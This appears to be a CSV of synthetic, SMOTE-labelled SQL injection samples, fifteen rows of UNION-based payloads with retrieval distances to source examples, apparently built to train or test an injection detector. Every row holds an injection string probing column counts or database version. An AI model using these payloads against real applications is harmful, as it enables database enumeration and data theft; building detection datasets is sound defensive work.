id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000282,0.8026275594493638
SMOTE_000002,attack,union,"-4285'   )    )     )   union all select 8819,8819,8819,8819,8819,8819,8819,8819#",nearest_attack_euclidean,R000211,1.02758519255647
SMOTE_000003,attack,union,"1'+  (  select oqvo where 7448  =  7448 union all select null,null,null,null,null--",nearest_attack_euclidean,R000155,0.3441288911239807
SMOTE_000004,attack,union,"1  )   as wokl where 1368  =  1368 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000234,0.4965885600383968
SMOTE_000005,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000129,0.20033568543879315
SMOTE_000006,attack,union,"-3130'   )    )     )   union all select 2886,2886,2886,2886,2886,2886,2886#",nearest_attack_euclidean,R000209,0.15539160208339303
SMOTE_000007,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000099,0.35507309201800946
SMOTE_000008,attack,union,"-2783' where 1494  =  1494 union all select 1494,1494,1494,1494,1494,1494--",nearest_attack_euclidean,R000199,1.1348323742018271
SMOTE_000009,attack,union," select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000089,0.6359830114480002
SMOTE_000010,attack,union,"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",nearest_attack_euclidean,R000138,0.9932437394766225
SMOTE_000011,attack,union,1'||  (  select 'ptkj' from dual where 6263  =  6263 union all select null--,nearest_attack_euclidean,R000213,0.5223457250746705
SMOTE_000012,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000117,0.13247200047085897
SMOTE_000013,attack,union,"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000171,0.520400938686439
SMOTE_000014,attack,union," select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000089,0.10430218213200097
SMOTE_000015,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000132,0.3462714205104459
